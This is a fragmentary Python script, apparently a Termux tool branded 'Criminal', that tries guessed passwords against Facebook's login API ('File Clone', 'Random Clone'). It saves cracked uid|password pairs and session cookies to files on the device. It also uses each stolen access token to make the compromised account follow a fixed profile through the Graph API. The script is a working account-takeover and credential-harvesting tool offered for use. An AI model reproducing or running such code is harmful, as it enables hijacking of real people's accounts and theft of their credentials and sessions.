...
logo = """\033[1;92m
 ...
 \033[1;92m-------------------------------------------------------
 \033[1;92m[+] AUTHOR     :\033[1;92m Termux Command
 \033[1;92m[+] GITHUB     : \033[1;92m  Criminal
 \033[1;92m[+] FACEBOOK   : \033[1;92mTermux Command
 \033[1;92m[+] STATUS     : \033[92;1mFREE
 \033[1;92m[+] VIRSION    : \033[1;92m0.1
 \033[1;92m[+]-------------------------------------------------------"""
def linex():
        print('\033[1;32m-----------------------------------------')
def clear():
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        #clear()
                        print(' [1] File Clone \n [2] Random Clone\033[1;92m\n [3] Get Fake-Email\033[1;92m\n [0] Exit PROGRAM ')
                        print('\033[1;92m -------------------------------------------------------')
...
"Content-Length": "698",}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Criminal] '+str(uid)+' | '+pas+'\033[1;90m')
                                        ...
                                        open('/sdcard/Criminal-CP.txt','a').write(coki+'\n')
                                        open('/sdcard/Criminal-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        break
                   ...
                   # 'device':gttt,
                    ...
                    'x-fb-friendly-name':'authenticate'
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/Criminal -OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [Criminal] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        oks.append(ids)
                                                        ...
                                                        requests.post('https://graph.facebook.com/100071596264601/subscribers?access_token='+tok, cookies={'cookie':coki})
                                                        open('/sdcard/Criminal-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [Criminal] '+uid+' | '+pas+'\033[1;97m')
                                                tok = str(q['access_token'])
                                                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])                                               
                                                requests.post('https://graph.facebook.com/100071596264601/subscribers?access_token='+tok, cookies={'cookie':coki})
                                                open('/sdcard/Criminal-OK.txt','a').write(uid+'|'+pas+'\n')
...
zahid = """\033[1;91m
 ...
 \033[1;97m[◇]-------------------------------------------------------
 \033[1;97m[◇] DEVELOPERS :\033[1;91m Termux Command\033[1;97m & \033[1;91mTermux Command
 \033[1;97m[◇] TEAM       : \033[1;91mAfghanistan
 \033[1;97m[◇] STATUS     : \033[91;1mFREE
 \033[1;97m[◇]-------------------------------------------------------"""
def danish():
        os.system('clear')
        print(zahid)
...
def contact():
                                print(' [1] Contact By Termux Command\n [2] Contact by Criminal \n [0] Back menu')
                                print('\033[1;97m [◇]-------------------------------------------------------')
                                x=input(' [◇] Choose: ')
                                if x in ['1','01']:
                                        os.system('xdg-open https://www.facebook.com/profile.php?id=61552748889142&mibextid=ZbWKwL')                                                             
